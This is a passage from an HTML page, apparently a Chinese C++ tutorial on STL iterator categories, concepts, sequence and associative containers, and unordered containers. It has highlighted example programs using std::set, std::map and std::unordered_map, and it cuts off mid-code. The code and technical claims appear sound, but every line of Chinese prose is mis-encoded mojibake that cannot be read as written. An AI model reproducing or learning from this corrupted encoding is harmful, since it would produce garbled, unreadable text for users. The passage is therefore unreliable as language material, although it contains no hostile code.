æ”¯æŒæ¯”è¾ƒç›¸ç­‰ (<code>==</code>, <code>!=</code>)ã€‚</li><li>  ç”¨äºéœ€è¦å¤šæ¬¡éå†åŒä¸€èŒƒå›´çš„ç®—æ³•ã€‚<code>std::forward_list</code> æä¾›å‰å‘è¿­ä»£å™¨ã€‚<code>unordered</code> å®¹å™¨ä¹Ÿæä¾›è‡³å°‘å‰å‘è¿­ä»£å™¨ã€‚</li></ul></li><li><p><strong>åŒå‘è¿­ä»£å™¨ (Bidirectional Iterator):</strong></p><ul><li>  ç»§æ‰¿äº†å‰å‘è¿­ä»£å™¨çš„æ‰€æœ‰èƒ½åŠ›ã€‚</li><li>  å¢åŠ äº†<strong>å‘å</strong>ç§»åŠ¨ (<code>--</code>) çš„èƒ½åŠ›ã€‚</li><li>  <code>std::list</code>, <code>std::set</code>, <code>std::map</code> æä¾›åŒå‘è¿­ä»£å™¨ã€‚</li></ul></li><li><p><strong>éšæœºè®¿é—®è¿­ä»£å™¨ (Random Access Iterator):</strong></p><ul><li>  æœ€å¼ºå¤§çš„è¿­ä»£å™¨ï¼Œç»§æ‰¿äº†åŒå‘è¿­ä»£å™¨çš„æ‰€æœ‰èƒ½åŠ›ã€‚</li><li>  æ”¯æŒ<strong>ç®—æœ¯è¿ç®—</strong>ï¼š<code>it + n</code>, <code>it - n</code>, <code>it += n</code>, <code>it -= n</code> (å¿«é€Ÿç§»åŠ¨åˆ°ä»»æ„ä½ç½®)ã€‚</li><li>  æ”¯æŒ<strong>ä¸‹æ ‡è¿ç®—</strong>ï¼š<code>it[n]</code> (ç­‰ä»·äº <code>*(it + n)</code>)ã€‚</li><li>  æ”¯æŒæ¯”è¾ƒå¤§å° (<code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>)ã€‚</li><li>  æ”¯æŒè®¡ç®—ä¸¤ä¸ªè¿­ä»£å™¨ä¹‹é—´çš„è·ç¦» (<code>it2 - it1</code>)ã€‚</li><li>  <code>std::vector</code>, <code>std::deque</code>, <code>std::array</code>, <code>std::string</code> æä¾›éšæœºè®¿é—®è¿­ä»£å™¨ã€‚æ™®é€šæŒ‡é’ˆä¹Ÿæ˜¯éšæœºè®¿é—®è¿­ä»£å™¨ã€‚</li></ul></li></ol><p>ç®—æ³•ä¼šæ ¹æ®å…¶éœ€è¦æŒ‡å®šå®ƒæ‰€è¦æ±‚çš„æœ€ä½è¿­ä»£å™¨ç±»åˆ«ã€‚ä¾‹å¦‚ï¼Œ<code>std::reverse</code> éœ€è¦åŒå‘è¿­ä»£å™¨ï¼Œè€Œ <code>std::sort</code> éœ€è¦éšæœºè®¿é—®è¿­ä»£å™¨ï¼ˆå› ä¸ºå®ƒéœ€è¦é«˜æ•ˆåœ°äº¤æ¢ä»»æ„ä½ç½®çš„å…ƒç´ ï¼‰ã€‚</p><h3 id="16-4-3-è¿­ä»£å™¨å±‚æ¬¡ç»“æ„"><a href="#16-4-3-è¿­ä»£å™¨å±‚æ¬¡ç»“æ„" class="headerlink" title="16.4.3 è¿­ä»£å™¨å±‚æ¬¡ç»“æ„"></a>16.4.3 è¿­ä»£å™¨å±‚æ¬¡ç»“æ„</h3><p>è¿™äº”ç§è¿­ä»£å™¨ç±»å‹å½¢æˆäº†ä¸€ä¸ªå±‚æ¬¡ç»“æ„ï¼Œåé¢çš„ç±»åˆ«æ‹¥æœ‰å‰é¢ç±»åˆ«æ‰€æœ‰ï¼ˆæˆ–ç­‰ä»·ï¼‰çš„åŠŸèƒ½ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input Iterator   Output Iterator</span><br><span class="line">      \             &#x2F;</span><br><span class="line">       Forward Iterator</span><br><span class="line">            |</span><br><span class="line">     Bidirectional Iterator</span><br><span class="line">            |</span><br><span class="line">     Random Access Iterator</span><br></pre></td></tr></table></figure><p>è¿™æ„å‘³ç€ï¼Œå¦‚æœä¸€ä¸ªç®—æ³•éœ€è¦å‰å‘è¿­ä»£å™¨ï¼Œä½ å¯ä»¥ä¼ é€’ç»™å®ƒå‰å‘ã€åŒå‘æˆ–éšæœºè®¿é—®è¿­ä»£å™¨ã€‚ä½†å¦‚æœç®—æ³•éœ€è¦éšæœºè®¿é—®è¿­ä»£å™¨ï¼Œä½ å°±ä¸èƒ½ä¼ é€’ç»™å®ƒåŒå‘æˆ–å‰å‘è¿­ä»£å™¨ã€‚</p><h3 id="16-4-4-æ¦‚å¿µã€æ”¹è¿›å’Œæ¨¡å‹-Concepts-Refinements-and-Models"><a href="#16-4-4-æ¦‚å¿µã€æ”¹è¿›å’Œæ¨¡å‹-Concepts-Refinements-and-Models" class="headerlink" title="16.4.4 æ¦‚å¿µã€æ”¹è¿›å’Œæ¨¡å‹ (Concepts, Refinements, and Models)"></a>16.4.4 æ¦‚å¿µã€æ”¹è¿›å’Œæ¨¡å‹ (Concepts, Refinements, and Models)</h3><p>STL çš„è®¾è®¡åŸºäº<strong>æ¦‚å¿µ (Concepts)</strong> çš„æ€æƒ³ã€‚ä¸€ä¸ªæ¦‚å¿µæ˜¯ä¸€ç»„å¯¹ç±»å‹çš„è¦æ±‚ï¼ˆåŒ…æ‹¬ç±»å‹å¿…é¡»æä¾›çš„æ“ä½œã€ç±»å‹åˆ«åã€è¯­ä¹‰ä¿è¯ç­‰ï¼‰ã€‚</p><ul><li>  <strong>æ¦‚å¿µ (Concept):</strong> ä¾‹å¦‚ï¼Œâ€œè¿­ä»£å™¨â€æ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œâ€œå¯æ’åº (Sortable)â€æ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œâ€œå®¹å™¨â€æ˜¯ä¸€ä¸ªæ¦‚å¿µã€‚</li><li>  <strong>æ”¹è¿› (Refinement):</strong> ä¸€ä¸ªæ¦‚å¿µå¯ä»¥æ˜¯å¦ä¸€ä¸ªæ¦‚å¿µçš„æ”¹è¿›ã€‚ä¾‹å¦‚ï¼Œâ€œå‰å‘è¿­ä»£å™¨â€æ˜¯â€œè¾“å…¥è¿­ä»£å™¨â€çš„æ”¹è¿›ï¼Œå› ä¸ºå®ƒå¢åŠ äº†å¯ä»¥å¤šæ¬¡è¯»å–çš„è¦æ±‚ã€‚â€œåŒå‘è¿­ä»£å™¨â€æ˜¯â€œå‰å‘è¿­ä»£å™¨â€çš„æ”¹è¿›ï¼Œå¢åŠ äº†å‘åç§»åŠ¨çš„è¦æ±‚ã€‚</li><li>  <strong>æ¨¡å‹ (Model):</strong> ä¸€ä¸ªå…·ä½“çš„ç±»å‹å¦‚æœæ»¡è¶³äº†æŸä¸ªæ¦‚å¿µçš„æ‰€æœ‰è¦æ±‚ï¼Œå°±ç§°ä¸ºè¯¥æ¦‚å¿µçš„ä¸€ä¸ª**æ¨¡å‹ (Model)**ã€‚ä¾‹å¦‚ï¼Œ<code>std::vector&lt;int&gt;::iterator</code> æ˜¯â€œéšæœºè®¿é—®è¿­ä»£å™¨â€æ¦‚å¿µçš„ä¸€ä¸ªæ¨¡å‹ã€‚<code>int</code> ç±»å‹æ˜¯â€œå¯ç›¸åŠ  (Additive)â€æ¦‚å¿µçš„ä¸€ä¸ªæ¨¡å‹ã€‚</li></ul><p>è™½ç„¶ C++ æ ‡å‡†æœ¬èº«ç›´åˆ° C++20 æ‰æ­£å¼å¼•å…¥è¯­è¨€çº§åˆ«çš„ Concepts æ”¯æŒï¼Œä½† STL ä»ä¸€å¼€å§‹å°±æ˜¯åŸºäºè¿™ç§æ€æƒ³è®¾è®¡çš„ã€‚ç®—æ³•çš„æ–‡æ¡£é€šå¸¸ä¼šè¯´æ˜å®ƒå¯¹æ¨¡æ¿å‚æ•°ï¼ˆç‰¹åˆ«æ˜¯è¿­ä»£å™¨ç±»å‹ï¼‰çš„æ¦‚å¿µè¦æ±‚ã€‚ä¾‹å¦‚ï¼Œ<code>std::sort</code> è¦æ±‚å…¶è¿­ä»£å™¨å‚æ•°æ˜¯â€œéšæœºè®¿é—®è¿­ä»£å™¨ (RandomAccessIterator)â€çš„æ¨¡å‹ï¼Œå¹¶ä¸”å…ƒç´ ç±»å‹æ˜¯â€œå¯å°äºæ¯”è¾ƒ (LessThanComparable)â€å’Œâ€œå¯ç§»åŠ¨æ„é€ /èµ‹å€¼ (MoveConstructible/MoveAssignable)â€çš„æ¨¡å‹ã€‚</p><p>ç†è§£æ¦‚å¿µæœ‰åŠ©äºæˆ‘ä»¬çŸ¥é“å“ªäº›ç®—æ³•å¯ä»¥ç”¨äºå“ªäº›å®¹å™¨æˆ–æ•°æ®ç±»å‹ã€‚</p><h3 id="16-4-5-å®¹å™¨ç§ç±»"><a href="#16-4-5-å®¹å™¨ç§ç±»" class="headerlink" title="16.4.5 å®¹å™¨ç§ç±»"></a>16.4.5 å®¹å™¨ç§ç±»</h3><p>STL æä¾›äº†å¤šç§å®¹å™¨ç±»å‹ï¼Œå¯ä»¥å¤§è‡´åˆ†ä¸ºå‡ ç±»ï¼š</p><ol><li><p><strong>é¡ºåºå®¹å™¨ (Sequence Containers):</strong> å…ƒç´ æŒ‰ç…§çº¿æ€§é¡ºåºæ’åˆ—ã€‚</p><ul><li>  <code>std::vector</code>: åŠ¨æ€æ•°ç»„ï¼Œè¿ç»­å†…å­˜ï¼Œéšæœºè®¿é—®å¿«ï¼Œå°¾éƒ¨æ’å…¥/åˆ é™¤å¿«ï¼Œä¸­é—´æ’å…¥/åˆ é™¤æ…¢ã€‚</li><li>  <code>std::deque</code> (Double-Ended Queue): åŒç«¯é˜Ÿåˆ—ï¼Œéè¿ç»­å†…å­˜ï¼ˆåˆ†å—ï¼‰ï¼Œæ”¯æŒéšæœºè®¿é—®ï¼Œ<strong>å¤´éƒ¨å’Œå°¾éƒ¨</strong>æ’å…¥/åˆ é™¤éƒ½å¿«ï¼Œä¸­é—´æ’å…¥/åˆ é™¤æ…¢ã€‚</li><li>  <code>std::list</code>: åŒå‘é“¾è¡¨ï¼Œéè¿ç»­å†…å­˜ï¼Œä¸æ”¯æŒéšæœºè®¿é—®ï¼ˆè®¿é—®å…ƒç´ éœ€éå†ï¼‰ï¼Œ<strong>ä»»ä½•ä½ç½®</strong>æ’å…¥/åˆ é™¤éƒ½å¿« (O(1))ã€‚</li><li>  <code>std::forward_list</code> (C++11): å•å‘é“¾è¡¨ï¼Œæ¯” <code>list</code> å¼€é”€æ›´å°ï¼Œåªæ”¯æŒå‘å‰éå†ï¼Œä»»ä½•ä½ç½®æ’å…¥/åˆ é™¤å¿«ã€‚</li><li>  <code>std::array</code> (C++11): <strong>å›ºå®šå¤§å°</strong>æ•°ç»„ï¼Œæ˜¯å¯¹ C é£æ ¼æ•°ç»„çš„å°è£…ï¼Œè¿ç»­å†…å­˜ï¼Œæ”¯æŒéšæœºè®¿é—®ï¼Œå¤§å°åœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œä¸èƒ½åŠ¨æ€æ”¹å˜ã€‚</li></ul></li><li><p><strong>å…³è”å®¹å™¨ (Associative Containers):</strong> å…ƒç´ æ ¹æ®<strong>é”® (Key)</strong> è¿›è¡Œæ’åºå’Œå­˜å‚¨ï¼ŒæŸ¥æ‰¾é€Ÿåº¦é€šå¸¸è¾ƒå¿« (å¯¹æ•°æ—¶é—´å¤æ‚åº¦ O(log N))ã€‚</p><ul><li>  <code>std::set</code>: å­˜å‚¨<strong>å”¯ä¸€</strong>å…ƒç´ çš„é›†åˆï¼Œè‡ªåŠ¨æ’åºã€‚</li><li>  <code>std::map</code>: å­˜å‚¨**é”®-å€¼å¯¹ (Key-Value Pair)**ï¼Œé”®æ˜¯å”¯ä¸€çš„ï¼Œæ ¹æ®é”®è‡ªåŠ¨æ’åºã€‚</li><li>  <code>std::multiset</code>: ç±»ä¼¼äº <code>set</code>ï¼Œä½†å…è®¸å­˜å‚¨<strong>é‡å¤</strong>å…ƒç´ ã€‚</li><li>  <code>std::multimap</code>: ç±»ä¼¼äº <code>map</code>ï¼Œä½†å…è®¸å­˜å‚¨å…·æœ‰<strong>ç›¸åŒé”®</strong>çš„å¤šä¸ªé”®-å€¼å¯¹ã€‚</li></ul></li><li><p><strong>æ— åºå…³è”å®¹å™¨ (Unordered Associative Containers) (C++11):</strong> å…ƒç´ æ ¹æ®é”®çš„<strong>å“ˆå¸Œå€¼ (Hash Value)</strong> å­˜å‚¨åœ¨æ¡¶ (Bucket) ä¸­ï¼Œä¸ä¿è¯å…ƒç´ é¡ºåºã€‚æ’å…¥ã€åˆ é™¤å’ŒæŸ¥æ‰¾çš„å¹³å‡æ—¶é—´å¤æ‚åº¦é€šå¸¸ä¸ºå¸¸æ•°æ—¶é—´ O(1)ï¼Œä½†æœ€åæƒ…å†µä¸‹å¯èƒ½é€€åŒ–ä¸ºçº¿æ€§æ—¶é—´ O(N)ã€‚</p><ul><li>  <code>std::unordered_set</code>: å­˜å‚¨å”¯ä¸€å…ƒç´ çš„å“ˆå¸Œé›†åˆã€‚</li><li>  <code>std::unordered_map</code>: å­˜å‚¨é”®-å€¼å¯¹çš„å“ˆå¸Œæ˜ å°„ï¼Œé”®å”¯ä¸€ã€‚</li><li>  <code>std::unordered_multiset</code>: å…è®¸é‡å¤å…ƒç´ çš„å“ˆå¸Œé›†åˆã€‚</li><li>  <code>std::unordered_multimap</code>: å…è®¸é‡å¤é”®çš„å“ˆå¸Œæ˜ å°„ã€‚</li></ul></li><li><p><strong>å®¹å™¨é€‚é…å™¨ (Container Adapters):</strong> åŸºäºå…¶ä»–å®¹å™¨ç±»å‹å®ç°ç‰¹å®šæ¥å£ï¼ˆé€šå¸¸é™åˆ¶äº†åº•å±‚å®¹å™¨çš„åŠŸèƒ½ï¼‰ã€‚</p><ul><li>  <code>std::stack</code>: åè¿›å…ˆå‡º (LIFO) æ ˆï¼Œé»˜è®¤åŸºäº <code>deque</code> å®ç°ã€‚</li><li>  <code>std::queue</code>: å…ˆè¿›å…ˆå‡º (FIFO) é˜Ÿåˆ—ï¼Œé»˜è®¤åŸºäº <code>deque</code> å®ç°ã€‚</li><li>  <code>std::priority_queue</code>: ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼Œæœ€å¤§ï¼ˆæˆ–æœ€å°ï¼‰å…ƒç´ æ€»æ˜¯åœ¨é¡¶éƒ¨ï¼Œé»˜è®¤åŸºäº <code>vector</code> å®ç°ã€‚</li></ul></li></ol><p>é€‰æ‹©å“ªç§å®¹å™¨å–å†³äºå…·ä½“éœ€æ±‚ï¼Œå¦‚æ˜¯å¦éœ€è¦æ’åºã€æ˜¯å¦éœ€è¦å¿«é€Ÿéšæœºè®¿é—®ã€æ’å…¥/åˆ é™¤çš„é¢‘ç‡å’Œä½ç½®ã€æ˜¯å¦å…è®¸é‡å¤å…ƒç´ ç­‰ã€‚</p><h3 id="16-4-6-å…³è”å®¹å™¨"><a href="#16-4-6-å…³è”å®¹å™¨" class="headerlink" title="16.4.6 å…³è”å®¹å™¨"></a>16.4.6 å…³è”å®¹å™¨</h3><p>å…³è”å®¹å™¨çš„æ ¸å¿ƒç‰¹ç‚¹æ˜¯å…ƒç´ æ ¹æ®<strong>é”®</strong>è‡ªåŠ¨æ’åºã€‚å®ƒä»¬é€šå¸¸ä½¿ç”¨æŸç§å½¢å¼çš„å¹³è¡¡äºŒå‰æœç´¢æ ‘ï¼ˆå¦‚çº¢é»‘æ ‘ï¼‰æ¥å®ç°ï¼Œä¿è¯äº†æ’å…¥ã€åˆ é™¤å’ŒæŸ¥æ‰¾æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¸º O(log N)ã€‚</p><ul><li><p><strong><code>std::set&lt;Key&gt;</code>:</strong></p><ul><li><p>  å­˜å‚¨ç±»å‹ä¸º <code>Key</code> çš„<strong>å”¯ä¸€</strong>å…ƒç´ ã€‚</p></li><li><p>  å…ƒç´ è‡ªåŠ¨æŒ‰å‡åºæ’åºï¼ˆé»˜è®¤ä½¿ç”¨ <code>operator&lt;</code>ï¼‰ã€‚</p></li><li><p>ä¸»è¦ç”¨äºå¿«é€Ÿæ£€æŸ¥å…ƒç´ æ˜¯å¦å­˜åœ¨ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">set</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; unique_words;</span><br><span class="line">    unique_words.insert(<span class="string">&quot;apple&quot;</span>);</span><br><span class="line">    unique_words.insert(<span class="string">&quot;banana&quot;</span>);</span><br><span class="line">    unique_words.insert(<span class="string">&quot;apple&quot;</span>); <span class="comment">// é‡å¤æ’å…¥ä¼šè¢«å¿½ç•¥</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Set contains: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; word : unique_words) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; word &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// è¾“å‡º: apple banana (å·²æ’åº)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unique_words.count(<span class="string">&quot;banana&quot;</span>)) &#123; <span class="comment">// count() è¿”å› 0 æˆ– 1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;banana is in the set.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> it = unique_words.find(<span class="string">&quot;cherry&quot;</span>); <span class="comment">// find() è¿”å›è¿­ä»£å™¨</span></span><br><span class="line">    <span class="keyword">if</span> (it == unique_words.end()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;cherry is not in the set.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>std::map&lt;Key, Value&gt;</code>:</strong></p><ul><li><p>  å­˜å‚¨ <code>std::pair&lt;const Key, Value&gt;</code> ç±»å‹çš„é”®-å€¼å¯¹ã€‚</p></li><li><p>  é”® <code>Key</code> å¿…é¡»æ˜¯<strong>å”¯ä¸€</strong>çš„ã€‚</p></li><li><p>  å…ƒç´ æ ¹æ®é”®è‡ªåŠ¨æ’åºã€‚</p></li><li><p>å¯ä»¥é€šè¿‡é”®å¿«é€ŸæŸ¥æ‰¾å¯¹åº”çš„å€¼ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">int</span>&gt; word_counts;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ’å…¥æ–¹å¼</span></span><br><span class="line">    word_counts.insert(&#123;<span class="string">&quot;apple&quot;</span>, <span class="number">3</span>&#125;);</span><br><span class="line">    word_counts.insert(<span class="built_in">std</span>::<span class="built_in">make_pair</span>(<span class="string">&quot;banana&quot;</span>, <span class="number">5</span>));</span><br><span class="line">    word_counts[<span class="string">&quot;cherry&quot;</span>] = <span class="number">2</span>; <span class="comment">// ä½¿ç”¨ operator[] æ’å…¥æˆ–æ›´æ–°</span></span><br><span class="line"></span><br><span class="line">    word_counts[<span class="string">&quot;apple&quot;</span>] = <span class="number">4</span>; <span class="comment">// æ›´æ–° apple çš„å€¼</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Map contains:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; <span class="built_in">pair</span> : word_counts) &#123;</span><br><span class="line">        <span class="comment">// pair.first æ˜¯ const Key, pair.second æ˜¯ Value</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">pair</span>.first &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; <span class="built_in">pair</span>.second &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// è¾“å‡ºæŒ‰é”®æ’åº: apple: 4, banana: 5, cherry: 2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count for banana: &quot;</span> &lt;&lt; word_counts[<span class="string">&quot;banana&quot;</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä½¿ç”¨ [] è®¿é—®</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> it = word_counts.find(<span class="string">&quot;grape&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (it == word_counts.end()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;grape not found.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šå¦‚æœä½¿ç”¨ operator[] è®¿é—®ä¸å­˜åœ¨çš„é”®ï¼Œä¼šè‡ªåŠ¨æ’å…¥ä¸€ä¸ªå…·æœ‰é»˜è®¤å€¼çš„å…ƒç´ ï¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count for grape (after []): &quot;</span> &lt;&lt; word_counts[<span class="string">&quot;grape&quot;</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0ï¼Œå¹¶æ’å…¥äº† &#123;&quot;grape&quot;, 0&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>  <strong><code>std::multiset&lt;Key&gt;</code>:</strong> å…è®¸å­˜å‚¨é‡å¤çš„é”®ï¼Œå…ƒç´ è‡ªåŠ¨æ’åºã€‚</p></li><li><p>  <strong><code>std::multimap&lt;Key, Value&gt;</code>:</strong> å…è®¸å­˜å‚¨é‡å¤çš„é”®ï¼Œé”®å€¼å¯¹æ ¹æ®é”®è‡ªåŠ¨æ’åºã€‚æŸ¥æ‰¾ä¼šè¿”å›ä¸€ä¸ªèŒƒå›´ï¼ˆæ‰€æœ‰å…·æœ‰è¯¥é”®çš„å…ƒç´ ï¼‰ã€‚</p></li></ul><h3 id="16-4-7-æ— åºå…³è”å®¹å™¨ï¼ˆC-11ï¼‰"><a href="#16-4-7-æ— åºå…³è”å®¹å™¨ï¼ˆC-11ï¼‰" class="headerlink" title="16.4.7 æ— åºå…³è”å®¹å™¨ï¼ˆC++11ï¼‰"></a>16.4.7 æ— åºå…³è”å®¹å™¨ï¼ˆC++11ï¼‰</h3><p>æ— åºå…³è”å®¹å™¨ä½¿ç”¨<strong>å“ˆå¸Œè¡¨ (Hash Table)</strong> å®ç°ï¼Œå…ƒç´ ä¸ä¿è¯ä»»ä½•ç‰¹å®šé¡ºåºã€‚å®ƒä»¬é€šè¿‡è®¡ç®—é”®çš„<strong>å“ˆå¸Œå€¼</strong>æ¥ç¡®å®šå…ƒç´ å­˜å‚¨çš„ä½ç½®ï¼ˆæ¡¶ï¼‰ã€‚</p><ul><li><p>  <strong>ä¼˜ç‚¹:</strong> æ’å…¥ã€åˆ é™¤å’ŒæŸ¥æ‰¾çš„<strong>å¹³å‡</strong>æ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼Œé€šå¸¸æ¯”å…³è”å®¹å™¨æ›´å¿«ã€‚</p></li><li><p><strong>ç¼ºç‚¹:</strong></p><ul><li>  <strong>æœ€å</strong>æƒ…å†µä¸‹çš„æ—¶é—´å¤æ‚åº¦ä¸º O(N)ï¼ˆå½“å‘ç”Ÿå¤§é‡å“ˆå¸Œå†²çªæ—¶ï¼‰ã€‚</li><li>  å…ƒç´ æ˜¯æ— åºçš„ã€‚</li><li>  éœ€è¦ä¸ºé”®ç±»å‹æä¾›<strong>å“ˆå¸Œå‡½æ•°</strong>å’Œ<strong>ç›¸ç­‰æ¯”è¾ƒ</strong>æ“ä½œï¼ˆæ ‡å‡†åº“ä¸ºåŸºæœ¬ç±»å‹å’Œ <code>string</code> ç­‰æä¾›äº†é»˜è®¤å®ç°ï¼‰ã€‚</li><li>  å“ˆå¸Œè¡¨æ“ä½œå¯èƒ½ä¼šå¯¼è‡´è¿­ä»£å™¨å¤±æ•ˆã€‚</li></ul></li><li><p>  <strong><code>std::unordered_set&lt;Key&gt;</code>:</strong> å­˜å‚¨å”¯ä¸€é”®çš„å“ˆå¸Œé›†åˆã€‚</p></li><li><p>  <strong><code>std::unordered_map&lt;Key, Value&gt;</code>:</strong> å­˜å‚¨å”¯ä¸€é”®å€¼å¯¹çš„å“ˆå¸Œæ˜ å°„ã€‚</p></li><li><p>  <strong><code>std::unordered_multiset&lt;Key&gt;</code>:</strong> å…è®¸é‡å¤é”®çš„å“ˆå¸Œé›†åˆã€‚</p></li><li><p>  <strong><code>std::unordered_multimap&lt;Key, Value&gt;</code>:</strong> å…è®¸é‡å¤é”®çš„å“ˆå¸Œæ˜ å°„ã€‚</p></li></ul><p><strong>ç¤ºä¾‹ (<code>unordered_map</code>):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">int</span>&gt; phonebook;</span><br><span class="line"></span><br><span class="line">    phonebook[<span class="string">&quot;Alice&quot;</span>] = <span class="number">12345</span>;</span><br><span class="line">    phonebook[<span class="string">&quot;Bob&quot;</span>] = <span class="number">67890</span>;</span><br><span class="line">    phonebook.insert(&#123;<span class="string">&quot;Charlie&quot;</span>, <span class="number">54321</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Phonebook (order not guaranteed):\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span 